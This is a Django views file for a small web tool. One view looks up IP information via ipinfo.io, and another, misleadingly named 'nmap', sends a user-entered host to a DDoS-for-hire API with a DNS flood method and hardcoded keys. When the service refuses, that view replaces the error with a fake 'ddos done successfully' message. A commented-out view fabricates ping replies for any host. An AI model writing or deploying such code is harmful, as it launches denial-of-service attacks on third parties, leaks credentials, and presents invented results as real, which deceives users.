from django.shortcuts import render
from django.http import HttpRequest, HttpResponse
from django.shortcuts import redirect, resolve_url
from .forms import NoteFrom
from .models import Note
import requests
import os
def home(request : HttpRequest):
    return render(request , "home/index.html")

def ip(request : HttpRequest):
    if request.method == "POST":
        url = request.POST["title"]
        ipnow = f"https://ipinfo.io/{url}?token=6ce4a0c98d1e26"
        ip_scan_now = requests.get(ipnow).text
        return render(request , "home/scan.html",{"ip" : url ,"api" : ip_scan_now} )

        #new_notes = NoteFrom(request.POST)
        #if new_notes.is_valid():
        #    new_notes.save()
            #return redirect(resolve_url("home:home"))
    return render(request , "home/scan.html")


def nmap(request : HttpRequest):
    if request.method == "POST":
        url = request.POST["title"]
        url_api1 = f"https://defconpro.io/apiv2.php?host={url}&port=53&time=200&method=DNS&key=a4e4k4j4y4w2247464x2844453743334d4j5n5t2j55474w2p2z244t2v243c4w2c4x233840364746454r2347484"
        ip_scan_now = requests.post(url_api1).text
        if """{"status":"0","version":"1.10","error":"You don't have a plan!"}""" in ip_scan_now:
            ip_scan_now = "ddos done successfully"

        return render(request , "home/ddos.html",{"ip" : url , "api" : ip_scan_now } )

    return render(request , "home/ddos.html" )

#def ping(request : HttpRequest):
#    if request.method == "POST":
#        url = request.POST["title"]
#        q = f"""        
#Pinging {url} with 32 bytes of data:
#Reply from {url}: bytes=32 time=102ms TTL=112
#Ping statistics for {url}:
#    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
#Approximate round trip times in milli-seconds:
#    Minimum = 86ms, Maximum = 102ms, Average = 93ms
#        """
#        
#
#        return render(request , "home/ddos.html",{"ip" : url , "api" : q} )
#        
#    return render(request , "home/ping.html" )

